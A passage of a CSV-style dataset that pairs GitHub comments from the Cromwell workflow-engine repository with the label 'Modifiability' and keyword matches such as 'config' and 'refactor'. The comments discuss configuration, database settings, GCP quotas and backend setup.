hardcode use of SSL; 9. count rows in WORKFLOW_EXECUTION; 10. Logging the just the URL in SlickDataAccess, not the entire config.; 11. Added a suite of mysql ssl test.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815:207,config,config,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815,9,"['config', 'variab']","['config', 'configuration', 'variable']"
Modifiability,"Not it isn't, I believe @mcovarr is working on something that should make this ""go away"". ; In the meantime you can try to increase `database.db.queueSize` in the configuration. Results are not guaranteed though it's just giving slick more room but it might still fail. The default is 1000.; Also how big is your workflow ? Must be large to hit this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2219#issuecomment-298055093:163,config,configuration,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2219#issuecomment-298055093,1,['config'],['configuration']
Modifiability,"Not necessarily the problem, but even non-obvious GCP quotas can limit how many workers are scheduled. Specifically, some things to look out for:. - Preemtible specific resources, like CPUs and Memory (if you're running preemtibles); - If you are using preemtibles, there may not be enough available instances; - Local SSD (GB); - Internal IP addresses; - In-use IP addresses; - List requests per 100 seconds. I thought mine were high enough, but from this page (replace `$region` with your region) you can click the ""Current Usage"" to sort by in-demand resources:. - https://console.cloud.google.com/iam-admin/quotas?project=portable-pipeline-project&location=$region. ![image](https://user-images.githubusercontent.com/22381693/72295508-d2132900-36ab-11ea-8380-256c2ad381b4.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5352#issuecomment-573891305:626,portab,portable-pipeline-project,626,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5352#issuecomment-573891305,1,['portab'],['portable-pipeline-project']
Modifiability,"Not sure if you're referring to my ""rewrite"" of a liquibase change log, but that was already merged to develop. Besides that fixed issue, there are further technical issues that I'm aware of blocking us from changing column names. Just use [`<renameColumn`](http://www.liquibase.org/documentation/changes/rename_column.html), like we have in a few cases in the changelog history already.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1219#issuecomment-237705566:36,rewrite,rewrite,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1219#issuecomment-237705566,1,['rewrite'],['rewrite']
Modifiability,"Note for future tech talk: The hash lookup will not work for private images when running locally, even though the job might run fine. This is because when running locally, as long as the user is logged in properly (with `docker login` or `gcloud login`), the docker command will be able to retrieve the image. However Cromwell does not go look for the user's docker config file on the machine to extract the auth information and use it when looking up the hash.; Another option would be to allow explicit declaration of authentication strategies in the config file (like we have for google). Currently only JES has a `dockerhub` entry. It could be generalized at the root level with something like; ```. dockerhub {; auths [; {; # this would look at ~/.docker/config.conf for example; name = ""application-default""; scheme = ""application_default""; },; {; name = ""custom""; scheme = ""custom""; account = ""bla""; token = ""bla""; }; ]; }; ```. and then any backend could do. `dockerhub-lookup.auth = ""application-default""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279087577:366,config,config,366,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279087577,3,['config'],['config']
Modifiability,"Now I am having trouble running the stack again (I've edited it to change the default of ScratchMountPoint to /cromwell_root). I deleted the old stacks. Getting a failure when trying to create the ec2 instance, but there is no helpful error as to why. . Is it possible to change the value of AWS_CROMWELL_LOCAL_DISK? Where do I change that? In the config file somewhere? If I could change that from /cromwell_root to /scratch then things ought to work with my existing AMI....",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468828705:348,config,config,348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468828705,1,['config'],['config']
Modifiability,"Now that I've read this more closely, I think it would be more appropriate to put this in its own tutorial doc file, rather than in the HPCIntro tutorial. Can you create a dedicated file in `docs/tutorials` for these instructions, called `HPCSlurmWithLocalScratch.md`? If you think this is a common use case for HPC users, you can link to the new file at the end of `HPCIntro`. . > If you'd like to configure Cromwell to use a local scratch device, [see instructions here](HPCSlurmWithLocalScratch.md).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6698#issuecomment-1061127845:399,config,configure,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6698#issuecomment-1061127845,1,['config'],['configure']
Modifiability,"OK, after discussion with @Horneth and @cjllanwarne:. ``` hocon; google {; application-name = ""cromwell"". auths = [; {; name = ""cromwell-service-account""; scheme = ""application_default""; },; {; name = ""user-via-refresh""; scheme = ""refresh""; client-id = ""secret_id""; client-secret = ""secret_secret""; }; ]; }. backend {; default = ""JES""; providers = [; {; name = ""JES""; class = ""cromwell.engine.backend.jes.JesBackend""; config {; ...; genomics {; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; // Use the Cromwell service account for creating the Pipeline and manipulating auth JSONs.; auth = ""cromwell-service-account""; }; filesystems = [; {; gcs {; auth = ""user-via-refresh""; }; }; ]; }; },; ...; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203502798:418,config,config,418,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203502798,1,['config'],['config']
Modifiability,"Oh @antonkulaga @Horneth, so the fix to this is to add `--entrypoint /bin/bash` to our config examples, so that we can guarantee overwriting whatever the docker is trying to do with `bash` (which Cromwell assumes)? That sounds sensible enough to me!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-301098364:87,config,config,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-301098364,1,['config'],['config']
Modifiability,"Oh hmm very good point, hadn't viewed it from the portability angle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-301222671:50,portab,portability,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-301222671,1,['portab'],['portability']
Modifiability,"Oh, actually now that that PR has been merged I suppose it's too late to edit the example config file. It can be fixed in whichever PR reworks this config file, I guess",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468851961:90,config,config,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468851961,2,['config'],['config']
Modifiability,"Oh, and the Backend refactoring that I did here will be necessary to implement the scatter-aware lookup function. With this new model, we just need to pass 1 new parameter to each `BackendCall` to give it enough information to index into scattered vars and it should be fairly straightforward to implement. If we don't merge this before I get to implementing that, then it'll just be a very annoying rebase later and I'll have to basically write the code twice because the structure is quite different.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134751766:20,refactor,refactoring,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134751766,1,['refactor'],['refactoring']
Modifiability,"Ok talked with Dan and there are a couple of problems here: ; We have two copies of three_step.cwl, one of which is used by unit tests and the other is used by Centaur. The unit tests currently don't SALAD input CWL so their input needs to be formatted just so. Real Cromwell does SALAD input CWL so it's a lot more flexible. Dan is working on a separate PR so the unit tests run SALAD.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3016#issuecomment-349759985:316,flexible,flexible,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3016#issuecomment-349759985,1,['flexible'],['flexible']
Modifiability,"Ok, I got singularity working, although I'm new to cromwell so please let me know if there's a better way!. hello.wdl:; ```; task hello {; command {; echo 'Hello world!'; }. runtime {; image: ""~/test.sif""; }. output {; File response = stdout(); }; }. workflow test {; call hello; }; ```. local.conf:; ```; include required(classpath(""application"")); backend {; default = singularity; providers {; singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; job-shell=""/bin/sh""; run-in-background = true ; runtime-attributes = """"""; String? image; """"""; submit = """"""; singularity exec ${image} ${job_shell} ${script}; """"""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-580114191:455,config,config,455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-580114191,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"Ok, just for clarification I will do the following:; 1. Remove validateRuntimeValue from wdl4s and create a PR in that repo.; 2. Add validateMemoryValue to JesInitializationActor.; 3. Refactor validateMemoryValue to return similar message than the other ones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212581683:184,Refactor,Refactor,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212581683,1,['Refactor'],['Refactor']
Modifiability,"Ok, running the Docker daemon as root is normal (the docs says it's [required](https://docs.docker.com/engine/security/security/), actually). The issues with non-root default users should be fixed in [this PR](https://github.com/broadinstitute/cromwell/pull/1865), but that code is currently only on develop (the forthcoming 25 release). non-root default users should Just Work with the code from that PR, you shouldn't have to make any changes to your config. The `master` branch corresponds to the 24 release; do you mean you're running the 23 release?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283009835:453,config,config,453,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283009835,1,['config'],['config']
Modifiability,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:794,config,config,794,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140,1,['config'],['config']
Modifiability,"Okay, I've made more progress. But more issues are popping up. @cjllanwarne . You cannot ask for the filesize of an sra file to configure the disk space you'd like at runtime thats what causes the ; `[2020-08-24 15:28:47,48] [error] 'nioPath' not implemented for SraPath` issue mentioned above. When I remove that line from my wdl things get better, but I'm running into two new separate issues. 1. Cromwell tries to chmod the mounted sra directory which is not allowed.; code:; https://github.com/broadinstitute/cromwell/blob/5c8f932b6e1a5706286913e21c78dc296dd5c79c/supportedBackends/google/pipelines/v2alpha1/src/main/scala/cromwell/backend/google/pipelines/v2alpha1/api/ContainerSetup.scala; error:; ```; [2020-08-25 10:40:46,26] [info] WorkflowManagerActor Workflow 282f5595-171e-4296-a7fa-9bd9f7a2f33b failed (during ExecutingWorkflowState): java.lang.Exception: Task Mutect2.renameBamIndex:NA:1 failed. The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/bin/bash -c mkdir -p /cromwell_root && chmod -R a+rwx /cromwell_root"": unexpected exit status 1 was not ignored; [ContainerSetup] Unexpected exit status 1 while running ""/bin/bash -c mkdir -p /cromwell_root && chmod -R a+rwx /cromwell_root"": chmod: changing permissions of '/cromwell_root/sra-SRR2806786': Function not implemented; chmod: changing permissions of '/cromwell_root/sra-SRR2806786/.initialized': Function not implemented. 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:88); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:695); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:128,config,configure,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['config'],['configure']
Modifiability,"Okay, I've pushed some config changes so that each `singularity build` happens in its own working directory. And I've added `sbatch --wait`, because then if the job fails, Cromwell will know about it. I'm now happy for this to reviewed, I think.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463922311:23,config,config,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463922311,1,['config'],['config']
Modifiability,"On hold for now. Using regular auth this appears to work manually but not in code. e.g. doing something like [this](https://docs.aws.amazon.com/AmazonECR/latest/userguide/Registries.html#registry_auth):. ```; TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken'); curl -i -H ""Authorization: Basic $TOKEN"" https://952500931424.dkr.ecr.us-east-1.amazonaws.com/v2/broadinstitute/cromwell/manfests/latest; ```. returns a blob of JSON containing all sorts of manifesty-looking data. However this doesn't seem to match up exactly with what the current code is doing: . * ~The current code sets `Bearer` auth, but that `curl` command works with `Basic` and not `Bearer`.~ Fixed, that was easy enough; * The current code expects to find the digest in the returned headers. However the digest is in the body and not the headers. It looks like having the `digest` in a `config` block is part of the spec so perhaps the existing code can actually parse and fall back on this if the digest isn't in the headers: https://docs.docker.com/registry/spec/manifest-v2-2/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486798910:910,config,config,910,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486798910,1,['config'],['config']
Modifiability,"On top of the original fix in #1647, the scalaz->cats in #1648, there is an additional commit to review for develop to refactor `SymbolTableMigration` to use trait `BatchedTaskChange`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1650#issuecomment-258478289:119,refactor,refactor,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1650#issuecomment-258478289,1,['refactor'],['refactor']
Modifiability,"Once I implemented a cache locally the workflow runs to Succeeded, but then the Centaur test fails because it's configured to expect workflowfailure. Judging by the fact that this test was part of [Tyburn](https://github.com/broadinstitute/tyburn/pull/27/files) which I believe lacked support for asserting failures, I don't think this is the correct expectation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224117892:112,config,configured,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224117892,1,['config'],['configured']
Modifiability,One of the things I'd like to come out of the upcoming JeffDoc is identify some spots where perhaps we could take advantage of streams instead of actors. I feel like a lot of these little operations winging around the periphery would fit that model - even if at first there's not much of a need for backpressure management (but it could lead to further refactorings where it did indeed help),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1374#issuecomment-245370201:353,refactor,refactorings,353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1374#issuecomment-245370201,1,['refactor'],['refactorings']
Modifiability,"Ooop, I might have misspoke. I thought the copy strategy did actually log that it was copying, but I realised that what I was seeing was that the `hard link` had failed, and knew that it was copying based on that:. > `WARN - Localization via hard link has failed: /path/to/destination.file -> /path/to/original.file: Invalid cross-device link`. I think it still might be useful, but I realise there's actually no precedent here. ---. Oh, so the path+modtime sort of just works? I was under the impression it wouldn't for those cache-strategies. I don't know if it wouldn't try, or would never succeed because I never tried, but here's what the [docs say](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options):. > - ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; > - ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. Thanks for the reply!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219:697,Config,Configuring,697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219,1,['Config'],['Configuring']
Modifiability,"Open a PR for a temporary fix using a `JAVA_OPT` environmental variable, although it is too generic.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3262#issuecomment-365552356:63,variab,variable,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3262#issuecomment-365552356,1,['variab'],['variable']
Modifiability,"Or, now that I think I understand the original scheme a little better:. - The job enters the `Running` state; - We immediately schedule an `CheckAlive` message to the actor at the configurable time; - If the cadence is not set, we never send that message (this would be the default); - When that CheckAlive arrives we can run `isAlive` and remember the result (and if we're still alive, schedule another `CheckAlive` again after the same delay); - To decide the new status:; - If we see a return code file, we use it; - Otherwise if `isAlive` is false and we've waited too long (could be configurable but I think we can set a sensible default) then we fail. I think that way the behavior is identical to today by default, but if we schedule `isAlive`s, then they behave as your scheme would imply. Do you think that would work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423571735:180,config,configurable,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423571735,2,['config'],['configurable']
Modifiability,"Per some of @kshakir's comments, IntelliJ has a _default_ formatting which we have not made any attempt to change. If these defaults cause consternation (or code review comments), we might consider developing a group style which we could all share and configure our IntelliJ's to use that. I definitely don't want to be fighting IntelliJ but I'm fine with moving away from the defaults if that's what the team wants.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/337#issuecomment-166000976:252,config,configure,252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/337#issuecomment-166000976,1,['config'],['configure']
Modifiability,"Per standup this morning we've decided to close this. The requested functionality is problematic on a few levels:. JSON runtime attributes are currently interpreted as WdlExpressions after going through coercion, which presently is a backend-dependent process as only the backend knows the accepted runtime attribute coercions. While currently it might appear safe to treat the default runtime attribute JSON values as WDL with a `WdlExpression.fromString`, that's an assumption of WDL / JSON expression equivalence not made elsewhere in Cromwell and it seems questionable to pioneer that here. Currently Cromwell's backend assignments happen at initialization time, but in the future Cromwell's backend dispatch is likely to become more sophisticated and dynamic. It therefore wouldn't be possible to say at workflow initialization time the backend to which a call was fated, which would mean the default runtime attribute handling would need to happen in the various `FooRuntimeAttributes` classes as it does now. The refactor proposed here would actually remove the default runtime attribute handling at call execution time and therefore make dynamic dispatch more difficult to add in the future. Finally, while it appears technically possible to doctor tasks with workflow option-derived default runtime attributes in `MaterializeWorkflowDescriptorActor`, this makes for some pretty hacky code. I discovered at least 3 spots that needed to be updated:; - backendAssignment values; - NamespaceWithWorkflow -> tasks; - NamespaceWithWorkflow -> workflow -> children -> tasks. That last item was particularly hideous since `Workflow#children` is explicitly write-once. I got around this with subclassing, but I felt bad about myself afterward.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-238635247:1020,refactor,refactor,1020,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-238635247,1,['refactor'],['refactor']
Modifiability,"Per the comments above is this meant to be a ""stealth"" feature or should there be something in the README.md to note its existence, config requirements, gotchas?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161277199:132,config,config,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161277199,1,['config'],['config']
Modifiability,Performance tests against the refactor are highlighted by the blue boxes:. ![Screen Shot 2019-09-09 at 5 33 44 PM](https://user-images.githubusercontent.com/13006282/64624289-6dbc2200-d3b8-11e9-8fc9-f9be83cd9f36.png),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529971535:30,refactor,refactor,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529971535,1,['refactor'],['refactor']
Modifiability,Please make this behavior configurable and defaulting to off,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451507377:26,config,configurable,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451507377,1,['config'],['configurable']
Modifiability,"Plugin has been submitted ""for approval"" by @cjllanwarne , will close the ticket when it's approved.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2246#issuecomment-303736986:0,Plugin,Plugin,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2246#issuecomment-303736986,1,['Plugin'],['Plugin']
Modifiability,"Pretty easy: https://doc.akka.io/docs/akka-http/current/scala/http/common/json-support.html#pretty-printing. I'm picking up a discussion on what the workbench-wide policy for such things should be (e.g. always-on, always-off, configurable). Once that's decided the path for this ticket will be clear.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2708#issuecomment-345252091:226,config,configurable,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2708#issuecomment-345252091,1,['config'],['configurable']
Modifiability,"Question: Is including reference-disk-localization manifest in the cromwell.config out of date when using GCPBatch as the backend? Should this just instead point to a separate config file? For example `include ""papi_v2_reference_image_manifest.conf""` in the config file instead?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358:76,config,config,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358,3,['config'],['config']
Modifiability,Quick update. I tweaked the config to be:; ```; system {; job-rate-control {; jobs = 1; per = 2 second; }; }; ```. and ran the test workflow above. I saw maximum concurrency - i.e. Batch requested the full number of vCPUs set in my compute environment (100). About 500 jobs succeeded before Cromwell threw an OOM exception. No Batch API Request Limit exceptions were encountered.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443927567:28,config,config,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443927567,1,['config'],['config']
Modifiability,"Quoth Dave: Green Team launched 50 workflows and could initially query the API despite some slowness. After they’ve been running for 45 mins or so, hitting the API is only intermittently successful:. ```; https://cromwell.gotc-staging.broadinstitute.org/api/workflows/v1/query; Ooops! The server was not able to produce a timely response to your request.; Please try again in a short while!; ```. ```; Unexpected error while awaiting Cromwell Workflow completion: Error hitting REST API: https://cromwell.gotc-staging.broadinstitute.org/api/workflows/v1/5296889b-8b88-41db-a5fa-d1071ac22a... => Unexpected response code: 502; ```. Just trying to get to the swagger page takes a couple of minutes to load or fails to load altogether. This is highly variable - about 2 hours in we still have 50 workflows running and API queries are coming back very quickly. In production using Cromwell 0.19, GotC routinely runs ~200-500 workflows simultaneously.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228405075:748,variab,variable,748,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228405075,1,['variab'],['variable']
Modifiability,"Re ""centaurable""-- I'm confident by updating the local backend to use `${script}` that centaur is actually exercising a third of the variables updated in patch. We could also change centaur to completely run on a new backend that also uses the `${out}` and `${err}` paths, as outlined in issue #1126. But because of that issue, this new centaur test would require a separate, new backend definition in `local_centaur.conf`. FYI: I still don't have a full fix for #1126, but this is a step in that direction. When I looked at the reference.conf, I noticed the local backend wasn't using `${script}`, wanted to know why, and discovered this small issue. This patch will also make the workaround in that ticket work as expected, instead of pointing to paths outside the docker container like `/Users/kshakir/<path>` now pointing paths inside like `/cromwell_root/<path>`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2028#issuecomment-282807954:133,variab,variables,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2028#issuecomment-282807954,1,['variab'],['variables']
Modifiability,"Re this PR, I'm re-working it to pass all of the task call-specific monitoring info (workflow name/id, task call name/index/attempt, `inputs`, `disks`, and the opaque image-specific `monitoringConfig` string) through a JSON config file on GCS (thanks @kshakir for the idea!). This way, we no longer have to use environmental variables, and can pass much more data than can be held in a variable (looking at you, `inputs`!). That still has a potential problem of running against the API quota for GCS, but since we already access multiple files from that execution bucket inside the task, the assumption is that accessing one extra file won't hurt. However, I'm unsure if we should just get rid of all of the environmental variables in favor of one that points to the GCS URL of the JSON config, or should we keep them (and thus duplicate information) for backwards compatibility. AFAIK, hardly anyone used this feature yet, especially given that the current ""official"" `monitoring_image` has been essentially broken, because Google decided to start failing Stackdriver Monitoring requests if they are submitted more than 1/minute, for a given time series. We should fix the `monitoring_image` separately (or replace it with the BigQuery version), but the question remains whether we still want to keep those env vars around for that previous use case (for anyone who might've been using a custom `monitoring_image` already). Alternatively, we could pass only the `inputs` and `monitoringConfig` through a JSON blob on GCS, and continue with the rest as-is via env vars (but that's messy, IMO).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502266400:224,config,config,224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502266400,5,"['config', 'variab']","['config', 'variable', 'variables']"
Modifiability,"Re:. > The capoeira tests complete successfully but get unexpected cache hits. Caching is also tweaked in CI configs. For example:. https://github.com/broadinstitute/cromwell/blob/279909b1f35c8305dcfc23ac8534dcb00ce09771/src/ci/resources/local_provider_config.inc.conf#L6. Have you already tried the tests locally with the CI configs? For unicromtal, one can run the existing CI scripts with a bit of bootstrap:; - Setup vault; - Setup mysql locally (I'm using `brew install mysql`); - [Initialize a `travis` mysql user with granted permissions](https://dev.mysql.com/doc/refman/8.0/en/adding-users.html); - [Using the `travis` user create a `cromwell_test` schema](https://github.com/broadinstitute/cromwell/blob/279909b1f35c8305dcfc23ac8534dcb00ce09771/core/src/test/resources/application.conf#L24). From the cromwell source directory, with all of the above setup, one can try to run `src/ci/resources/testCentaurLocal.sh` and it will render the configs with vault and run the tests, including the restart tests that bring down/up cromwell. Also, if one just wants to ever use the CI configs with cromwell in IntelliJ, `sbt renderCiResources` will render configs into the folder `target/ci/resources`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472915580:109,config,configs,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472915580,5,['config'],['configs']
Modifiability,"Ready for re-review. Going to leave the commits separate though, as the implementation of server logging config feels sketchy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/330#issuecomment-165333960:105,config,config,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/330#issuecomment-165333960,1,['config'],['config']
